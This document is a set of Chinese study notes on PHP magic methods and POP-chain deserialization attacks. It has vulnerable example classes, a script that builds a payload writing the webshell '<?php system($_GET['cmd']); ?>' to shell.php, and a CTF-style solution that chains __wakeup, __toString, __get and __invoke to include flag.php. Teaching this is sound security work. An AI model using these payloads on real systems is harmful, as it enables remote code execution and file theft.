# PHP 魔术方法整理

## 构造与析构

==1. **`__construct()`** - 类的构建函数，在创建对象时调用==
    
==2. **`__destruct()`** - 类的析构函数，在对象被销毁或对象所有引用被删除时调用==
    

## 方法调用相关

3. **`__call()`** - 在对象中调用一个不可访问(或不存在)方法时调用
    
4. **`__callStatic()`** - 用静态方式调用一个不可访问(或不存在)方法时调用
    

## 属性访问相关

5. **`__get()`** - 获得一个类的不可访问(或不存在)成员变量时调用
    
6. **`__set()`** - 设置一个类的不可访问(或不存在)成员变量时调用
    
7. **`__isset()`** - 当对不可访问属性调用 `isset()` 或 `empty()` 时调用
    
8. **`__unset()`** - 当对不可访问属性调用 `unset()` 时调用
    

## 序列化相关

==9. **`__sleep()`** - 执行 `serialize()` 时，先会调用这个函数==
    
==10. **`__wakeup()`** - 执行 `unserialize()` 时，先会调用这个函数==
    

## 对象表示相关

==11. **`__toString()`** - 类被当成字符串时的回应方法==
    
==12. **`__invoke()`** - 以调用函数的方式调用一个对象时的回应方法==
    

## 其他特殊方法

13. **`__set_state()`** - 调用 `var_export()` 导出类时，此静态方法被调用
    
14. **`__clone()`** - 当对象复制完成时调用
    
15. **`__autoload()`** - 尝试加载未定义的类（已弃用，建议使用 `spl_autoload_register()`）
    
16. **`__debugInfo()`** - 打印所需调试信息，在使用 `var_dump()` 时调用

# **POP链**（Property-Oriented Programming，面向属性编程）
## 前置知识
**POP链**是一种利用代码中已存在的类、方法（尤其是魔术方法）和属性，通过控制对象的属性（Property）来连接一系列看似无害的代码片段（Gadgets），最终达到恶意目的（如执行任意代码、读写文件等）的攻击技术。

在真实的漏洞利用中，情况很少像我们之前例子中那么简单（一个类的 `__destruct` 方法里直接有一个危险函数）。更常见的情况是：

- **危险函数藏在深处**：`eval()`、`system()`、`file_put_contents()` 这些危险函数可能在一个普通的类方法里（例如 `FileCache::delete()`）。
    
- **没有直接调用**：你的入口点（如 `__destruct`）里没有任何明显的危险操作。
    
- **需要连环调用**：需要调用A对象的a方法，a方法又调用了B对象的b方法，b方法才最终调用了那个危险函数。
    

POP链就是把这些分散的代码片段（Gadgets）“捡”起来，“串”成一条能达到攻击目的的链条。

### POP链的核心要素

一条POP链通常由三部分组成：

1. **入口点（Sink Starter / Gadget Chain Starter）**：通常是自动调用的魔术方法，如 `__destruct()`, `__wakeup()`。这是反序列化后攻击的起点，整个链条的“发动机”。
    
2. **中间跳板（Middle Gadgets）**：一系列其他对象的方法调用。通常利用的是这些对象中的 `__toString()`, `__call()`, `__get()` 等方法，它们像桥梁一样，将执行流从入口点一步步传递到最终目标。
    
3. **最终目标（Sink）**：执行危险操作的地方，也就是我们攻击的最终目的。例如包含了一个文件包含（`include()`）、命令执行（`system()`）、文件写入（`file_put_contents()`）等函数的代码片段。

### 一个详细的POP链例子
假设我们有下面三个类，它们本身看起来都没有特别严重的问题：
```php
// File: example.php
<?php

class FileWriter {
    public $filename;
    public $data;

    public function write() {
        // 【最终目标】危险函数！如果我们能控制filename和data，就能写任意文件。
        file_put_contents($this->filename, $this->data);
    }
}

class Logger {
    private $fileWriter;

    public function __construct() {
        $this->fileWriter = new FileWriter();
    }

    public function __call($name, $arguments) {
        // 【中间跳板】当调用不存在的方法时，会触发__call。
        // 这里它将调用转发给 $fileWriter 对象的同名方法。
        return call_user_func_array([$this->fileWriter, $name], $arguments);
    }
}

class MainClass {
    public $logger;

    public function __destruct() {
        // 【入口点】对象销毁时，会自动调用log方法？
        // 注意：MainClass本身并没有log方法！
        $this->logger->log();
    }
}

// 来自用户不可信的输入
$user_input = $_GET['data'];
unserialize($user_input);
?>
```
**漏洞分析：**

1. **入口点**：`MainClass::__destruct()`。反序列化完成后，对象销毁时会自动调用它。
    
2. **问题**：`$this->logger->log();` 试图调用 `logger` 对象的 `log` 方法。
    
3. **如果 `logger` 是 `Logger` 对象**：`Logger` 类**没有** `log` 方法！这会触发它的 `__call($name, $arguments)` 魔术方法，其中 `$name` 是 `"log"`。
    
4. **中间跳板**：`Logger::__call()` 方法会执行 `$this->fileWriter->log()`。但 `FileWriter` 也**没有** `log` 方法！这看起来好像失败了？
    
5. **关键点（属性控制）**：注意，在反序列化时，我们可以完全控制所有对象的属性！我们可以让 `MainClass->logger` 不是一个 `Logger` 对象，而是一个 `FileWriter` 对象！同时，我们让 `Logger->fileWriter` 也是一个 `FileWriter` 对象。

**攻击者构造POP链的思路：**

> 我的目标是调用 `FileWriter::write()`。
> 
> 1. 入口是 `MainClass::__destruct()`，它会调用 `$this->logger->log()`。
>     
> 2. 如果我让 `$this->logger` 是一个 `Logger` 对象，它会因为找不到 `log()` 而调用 `Logger::__call('log')`。
>     
> 3. `Logger::__call` 又会去调用 `$this->fileWriter->log()`。
>     
> 4. 如果我让 `Logger->fileWriter` 是一个 `FileWriter` 对象，它也没有 `log()` 方法，这会出错…… 这条路不行。
>     
> 
> **换个思路（也是更常见的思路）：**
> 
> 1. 如果我**直接**让 `MainClass->logger` 是一个 `FileWriter` 对象呢？
>     
> 2. `MainClass::__destruct()` 会执行 `$this->logger->log()`，即 `FileWriter->log()`。
>     
> 3. `FileWriter` 没有 `log()` 方法，但PHP会尝试寻找 `__call()`，而 `FileWriter` 没有 `__call()`，所以会报错…… 还是不行。
>     
> 
> **最终成功的思路（利用中间跳板）：**  
> 我们需要一个能**将不存在的方法调用转发给其他对象**的类作为跳板。`Logger` 的 `__call` 正好就是！
> 
> 4. 让 `MainClass->logger` 是一个 `Logger` 对象。
>     
> 5. 让 `Logger->fileWriter` 是一个 `FileWriter` 对象。
>     
> 6. 让 `FileWriter->filename` 和 `FileWriter->data` 是攻击者控制的值（如 `shell.php` 和 `<?php phpinfo();?>`）。
>     
> 
> **执行流：**  
> `MainClass::__destruct()` ->  
> `$this->logger->log()` (Logger对象没有log方法) ->  
> `Logger::__call('log')` ->  
> `$this->fileWriter->log()` (FileWriter对象没有log方法，但__call不管，它用call_user_func_array调用了) ->  
> **`FileWriter::write()`** 🎉（因为 `call_user_func_array([$fileWriter, 'log'])` 实际上会去调用 `$fileWriter->write()`？不对，这里有个误区！）

**修正上面的错误**：`call_user_func_array([$this->fileWriter, $name], $arguments)` 中的 `$name` 是 `'log'`，所以它调用的是 `$fileWriter->log()`，而不是 `$fileWriter->write()`。所以这个链子其实是不通的。

**让我们修正这个例子，让它真正可用：**

我们需要修改 `Logger::__call` 的行为，或者改变目标。

```php
// 修改 Logger 类
class Logger {
    private $fileWriter;

    public function __construct() {
        $this->fileWriter = new FileWriter();
    }

    public function __toString() {
        // 【中间跳板】当一个对象被当作字符串使用时触发
        // 我们让它调用FileWriter的write方法
        return $this->fileWriter->write();
    }
}

class MainClass {
    public $logger;

    public function __destruct() {
        // 【入口点】将logger对象当作字符串使用，例如echo
        echo $this->logger;
    }
}
```

**攻击者构造：**

1. **入口点**：`MainClass::__destruct()` 会执行 `echo $this->logger`。
    
2. **如果 `$this->logger` 是一个 `Logger` 对象**：echo 一个对象会触发它的 `__toString()` 方法。
    
3. **中间跳板**：`Logger::__toString()` 被调用，它执行 `$this->fileWriter->write()`。
    
4. **最终目标**：`FileWriter::write()` 被调用，它使用攻击者控制的 `filename` 和 `data` 属性写入文件。
    

**构造恶意序列化字符串的伪代码：**

```php
$fileWriter = new FileWriter();
$fileWriter->filename = "shell.php";
$fileWriter->data = "<?php system($_GET['cmd']); ?>";

$logger = new Logger();
// 通过反射等方式强制将私有属性 $fileWriter 设置为我们的恶意 $fileWriter 对象
// $logger->fileWriter = $fileWriter;

$mainObj = new MainClass();
$mainObj->logger = $logger; // 将logger设置为我们的$logger对象

$maliciousPayload = serialize($mainObj);
echo urlencode($maliciousPayload); // 这就是我们要发送的payload
```

### 一个更简单的例子
```php
<?php  
//flag is in flag.php  
class Modifier {  
    private $var;  
    public function append($value)  
    {  
        include($value);  
        echo $flag;  
    }  
    public function __invoke(){  
        $this->append($this->var);  
    }  
}  
  
class Show{  
    public $source;  
    public $str;  
    public function __toString(){  
        return $this->str->source;  
    }  
    public function __wakeup(){  
        echo $this->source;  
    }  
}  
  
class Test{  
    public $p;  
    public function __construct(){  
        $this->p = array();  
    }  
  
    public function __get($key){  
        $function = $this->p;  
        return $function();  
    }  
}  

  
if(isset($_GET['pop'])){  
    unserialize($_GET['pop']);  
}  
?>
```
解题
```php
<?php  
//flag is in flag.php  
class Modifier {  
    private $var = 'flag.php';  
    public function append($value)  
    {  
        include($value);  
        echo $flag;  
    }  
    public function __invoke(){  
        $this->append($this->var);  
    }  
}  
  
class Show{  
    public $source;  
    public $str;  
    public function __toString(){  
        return $this->str->source;  
    }  
    public function __wakeup(){  
        echo $this->source;  
    }  
}  
  
class Test{  
    public $p;  
    public function __construct(){  
        $this->p = array();  
    }  
  
    public function __get($key){  
        $function = $this->p;  
        return $function();  
    }  
}  
 
//创建三个新的对象 
$modi = new Modifier();  
$show = new Show();  
$test = new Test();  

//unserialize()触发show中的__wekeup()
//__wekeup()中有一个echo函数看了一下可以触发show中的__tostring()
//并且触发__tostring()需要echo 一个类
$show->source=$show;  

//__tostring()触发后return $this->str->source;也就是Test->source但是Test中无source属性触发__get()方法
$show->str = $test;  

//Test中__get()被触发，return $this->p()也就是把Modifier类当作了函数执行
$test->p = $modi;  

//触发了Modifier中__invoke()方法执行append(flag.php)函数包含flag.php输出其中的flag
echo serialize($show);

?>
```

#### 更正规的解释

1. **起点：`unserialize($_GET['pop'])`**
    
    - 传入 `pop` 参数，触发反序列化。反序列化一个 `Show` 类的对象 `$show` 时，会自动调用其 `__wakeup()` 魔法方法。
        
2. **Step 1: `__wakeup() -> echo $this->source`**
    
    - `__wakeup()` 方法中执行了 `echo $this->source;`。
        
    - 我们将 `$show->source` 设置为 `$show` 对象本身（即 `$show->source = $show;`）。
        
    - `echo` 一个对象时，PHP 会尝试将其转换为字符串，从而触发该对象的 `__toString()` 方法。
        
3. **Step 2: `__toString() -> $this->str->source`**
    
    - `Show` 类的 `__toString()` 方法返回 `$this->str->source`。
        
    - 我们将 `$show->str` 设置为 `$test`（一个 `Test` 类的对象）。
        
    - 现在代码试图获取 `$test->source`。但 `Test` 类中并没有定义 `source` 属性，访问不可访问的属性会触发 `__get()` 魔法方法。
        
4. **Step 3: `__get() -> $function()`**
    
    - `Test` 类的 `__get($key)` 方法执行了 `$function = $this->p; return $function();`。
        
    - 我们将 `$test->p` 设置为 `$modi`（一个 `Modifier` 类的对象）。
        
    - 现在代码执行 `$modi();`，即试图将一个对象当作函数来调用。这会触发该对象的 `__invoke()` 魔法方法。
        
5. **Step 4: `__invoke() -> append($this->var)`**
    
    - `Modifier` 类的 `__invoke()` 方法调用了 `$this->append($this->var);`。
        
    - 我们提前在 `Modifier` 类中定义私有属性 `$var` 的值为 `'flag.php'`。
        
    - `append('flag.php')` 方法执行了 `include('flag.php');`，包含了 `flag.php` 文件，并输出其中定义的 `$flag` 变量，从而得到 flag。
```php
<?php
class Modifier {
    private $var = 'flag.php'; // 关键：设置要包含的文件名
}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

// 构造利用链
$modi = new Modifier();
$show = new Show();
$test = new Test();

// 连接利用链
$show->source = $show; // __wakeup() -> echo 触发 __toString()
$show->str = $test;    // __toString() 访问 $test->source 触发 __get()
$test->p = $modi;      // __get() 将 $modi 当作函数调用，触发 __invoke()

// 生成 payload
$payload = serialize($show);
echo $payload;
echo "\n\n";
echo urlencode($payload); // 因为要通过 GET 传输，所以最好进行 URL 编码
?>
```
### 总结

- **POP链的本质**：是“**借刀杀人**”，利用程序自身的代码逻辑来达到攻击目的。
    
- **攻击者的工作**：像侦探一样，在源代码中寻找所有可能的Gadgets（魔术方法、普通方法、属性），并思考如何通过控制属性将它们连接成一条有效的链条。
    
- **难度**：挖掘POP链通常需要源代码（白盒测试）或者对常见框架、库的代码非常熟悉（黑盒测试，基于已知组件的漏洞）。
    
- **防御**：除了永远不反序列化不可信数据，使用`json_encode`/`json_decode`替代外，对魔术方法的使用保持谨慎，避免在魔术方法中包含敏感操作。
